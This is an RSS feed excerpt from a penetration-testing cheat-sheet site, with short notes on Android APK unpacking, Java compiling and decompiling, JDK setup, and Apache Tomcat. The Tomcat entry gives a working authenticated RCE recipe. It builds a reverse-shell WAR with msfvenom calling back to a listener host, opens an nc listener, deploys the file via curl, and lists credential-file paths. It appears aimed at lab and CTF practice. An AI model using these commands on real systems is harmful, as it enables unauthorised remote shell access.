channel.title: Java on TLDRBins
channel.description: Recent content in Java on TLDRBins

item.title: Android
item.description: Tool apktool jadx Unpack .apk # Get .smali files apktool d app.apk # Get .java files jadx app.apk

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war # Open a nc listener rlwrap nc -lvnp 1337 Manager GUI +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -> Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ Manager Script curl -u 'username:password' http://10.10.11.10:8080/manager/text/deploy?path=/revshell --upload-file revshell.war curl -s http://10.10.11.10:8080/revshell

item.title: Java
item.description: Java Decompile JAR Download jd-gui jd-gui Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ .

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac
